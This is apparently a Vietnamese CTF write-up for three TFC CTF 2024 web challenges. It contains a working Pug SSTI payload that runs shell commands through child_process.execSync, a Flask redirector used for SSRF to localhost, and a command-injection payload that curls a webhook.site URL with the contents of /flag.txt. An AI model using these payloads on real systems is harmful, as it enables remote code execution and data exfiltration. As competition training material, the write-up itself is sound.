# TFC_CTF2024

- Lâu ngày không chơi nên gà quá, solve được vài câu mong ae hok chê =))

## GREETINGS

- Ở đây web sẽ nhận input và render nó lên màn hình cho chúng ta. 

![image](https://github.com/user-attachments/assets/90b7cb4c-6fa0-45af-8db5-813292650871)

- Sau một hồi test thì mình phát hiện ra 2 lỗi là XSS và SSTI.

![image](https://github.com/user-attachments/assets/3fb63774-181c-4cc8-929b-8c9183a8897f)

- Nhưng theo king nghiệm của mình thì có vẻ như chall này không có bot nên chắc sẽ không theo hướng XSS được.
- Mình chuyển qua SSTI thì nó đã dính.

![image](https://github.com/user-attachments/assets/dada8026-ff7a-41bf-8c9b-73f4f6bd205f)

- Mấy ông anh mình chỉ mình fuzz ra được trang web dùng NodeJS và thư viện Pug :>>

![image](https://github.com/user-attachments/assets/076cea02-65fe-4ad3-834d-c16950107bd8)

- Oke việc của chúng ta bây giờ là lên mạng tìm một cái payload và lấy flag thôi :>
- Sau một hồi thử thì mình phát hiện ra một ```constructor``` tên là ```_load``` tại đây chúng ta có thể thực hiện include ```chill_process``` để có thể RCE.

```result?username=%23{global.process.mainModule.constructor._load}```

![image](https://github.com/user-attachments/assets/c938b495-169a-4e9f-a91f-fdaff2d35d83)

- Tuy nhiên để có thể thực thi và return ra màn hình, chúng ta phải sử dụng một method của thằng này đó là ```execSync```

```result?username=%23{global.process.mainModule.constructor._load("child_process").execSync("cat flag.txt")}```

![image](https://github.com/user-attachments/assets/d52846cc-2293-4044-a307-2ec9e54c7cac)

## SURFING
- Chall này mình làm tốn 1 đêm nên mình sẽ đổ thừa là nó lỏ chứ không phải cho mình gà =))

![image](https://github.com/user-attachments/assets/66a8532f-e520-4d83-8b3b-cc827b1cd959)

- Tại đây chall vẫn sẽ là nhận một input theo dạng url của google để có thể đọc là return về một HTML trên màn hình của chúng ta.
- Hmmmm, ý tưởng của mình lúc này là tìm một api của gg có thể rediret tới một path nào đó của web mà ta có thể đọc và lấy flag.

![image](https://github.com/user-attachments/assets/8854a3fc-22d8-4445-8d8c-c4d80a0c5358)

- Ở đây có một đường link có thể nằm trong docker của web đó là ```localhost:8000```
- Oke bây giờ mình sẽ dùng ```/amp/s``` để đọc.
- Chúng ta sẽ dựng một trang web bằng python để rediret tới localhost và mượn server render kết quả đó là lụm :>

![Untitled](https://github.com/user-attachments/assets/49c4ee77-23bc-4344-a71a-7e4732c3bc77)

- Oke h viết code thôi

```py
from flask import Flask, redirect

app = Flask(__name__)


@app.route('/')
def index():
    return redirect('http://localhost:8000/admin.php?username=admin&password=admin')


if __name__ == '_main_':
    app.run('0.0.0.0', port=8001, debug=True)
```

- Sau đó host bằng ngrok và cho server render.

![Untitled](https://github.com/user-attachments/assets/418d9120-e54d-43c7-9aaf-6c1c92121bdb)

## SAFE_CONTENT

- Câu này mình giải nhanh vl =))) 10p solve ( vua của PHP i'm back ).

![image](https://github.com/user-attachments/assets/3d30f492-7edd-4388-8f6d-05a927c8df28)

- Bài này dính một lỗi khá cơ bản của PHP.
- Thằng em mình bảo "bài đó dùng parse_url để parse rồi file_get_content nên cook"
- Lý do là vì 2 hàm này hiểu 2 host khác nhau nên suy ra nó chả có tác dụng gì mấy =))

```py
import requests
import base64

REMOTE = "http://challs.tfcctf.com:31635/"

payload = b"'' | curl https://webhook.site/ef95f1b8-3d2f-4fda-9962-5501e1493a66/?a=$(cat /flag.txt); ls "
payload = b"data://localhost/," + base64.b64encode(payload)
print(payload)
```

- Đây là đoạn code gen payload của mình, giờ thì chỉ cần gửi lên cho server là qua webhook lụm flag :>

```data://localhost/,JycgfCBjdXJsIGh0dHBzOi8vd2ViaG9vay5zaXRlL2VmOTVmMWI4LTNkMmYtNGZkYS05OTYyLTU1MDFlMTQ5M2E2Ni8/YT0kKGNhdCAvZmxhZy50eHQpOyBscyA=```

![image](https://github.com/user-attachments/assets/f09a2625-07f5-44b8-9575-2e7bf3186cb8)

## Tổng kết
cảm ơn ae đã chỉ em dê =))
